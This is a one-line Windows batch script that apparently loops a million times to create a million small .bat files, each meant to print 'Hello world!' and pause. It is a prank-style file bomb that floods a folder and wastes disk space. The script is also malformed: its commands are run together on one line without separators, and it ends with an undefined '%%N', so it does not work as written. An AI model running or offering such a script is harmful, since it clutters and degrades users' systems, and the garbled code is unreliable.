FOR /L %%x IN (1,1,1000000) DO  echo "bobber" > newFile%%x.bat echo echo Hello world! >> newFile%%x.bat echo pause >> newFile%%x.bat  %%N
